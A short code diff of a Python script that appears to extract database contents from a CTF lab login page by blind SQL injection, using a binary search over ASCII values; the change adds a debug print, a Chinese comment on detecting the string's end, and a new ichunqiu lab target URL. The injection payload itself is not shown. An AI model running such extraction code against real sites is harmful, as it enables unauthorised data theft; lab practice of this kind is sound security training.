@@ -25,11 +25,12 @@ def Get(url):
             else:
                 right = mid
             mid = (left+right)//2 #字段中的字符的ASCII码小于或等于mid值时执行
+            print("i= {0} , left = {1}, right = {2}, mid = {3}".format(i,left,right,mid))
         #查询结果结束
-        if mid==32:
+        if mid==32: # 检测到到达字符串的结尾，所以中断本次循环并i+1
             break
         result += chr(mid)
         print(result)
     print(result)
 
-Get('http://eci-2ze3r9vbw6bofm47wcsp.cloudeci1.ichunqiu.com/login.php')
+Get('http://eci-2ze327u4f9r35ohyxr1y.cloudeci1.ichunqiu.com/login.php')
